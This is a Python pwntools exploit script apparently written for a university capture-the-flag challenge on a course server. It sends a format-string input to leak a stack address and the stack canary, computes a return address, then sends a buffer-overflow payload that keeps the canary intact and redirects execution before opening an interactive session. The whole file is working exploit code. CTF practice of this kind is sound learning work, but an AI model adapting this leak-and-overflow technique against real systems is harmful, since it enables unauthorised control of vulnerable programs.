import subprocess
from pwn import *
import calculateOffset

server = "cs2107-ctfd-i.comp.nus.edu.sg"
port = 5003

r = remote(server,port)
leakedAdd = None
newAdd = None
canary = None
def getOutput():
    try:
        output = (r.recvline(timeout=1).decode()) # recvline is blocking
        return output  
    except Exception as e:
        return ''

def readAll():
    global leakedAdd
    global newAdd
    global canary
    while True:
        line = getOutput()
        if extractHex(line):
            leakedAdd = extractHex(line)[0]
            print(f"leaked address is {leakedAdd}")
            newAdd = calculateOffset.calculateNewAdd(leakedAdd)
            print(f"new address is {newAdd}")
            canary = extractHex(line)[1]
            print(f"canary value is {canary}")
        if not line:
           break
        print(line, end='')


def extractHex(line):
    matches = re.findall(r'0x[0-9a-fA-F]+', line)
    if matches:
        return tuple(matches)  # Return the matched string (hex value)
    return None  # Return None if no match is found


def calculatePayload():
    length = 56
    payload = b'A'*length
#    payload += b'A'*1 #For testing purposes
    payload += p64(int(canary, 16))
    payload += b'A'*8
    payload += p64(int(newAdd,16))
    payload += b'\n'
    return payload

readAll()
r.send(b'%13$p %11$p' + b'\n')

readAll()
r.send(b'2' + b'\n')

readAll()
r.send(calculatePayload())

r.interactive()










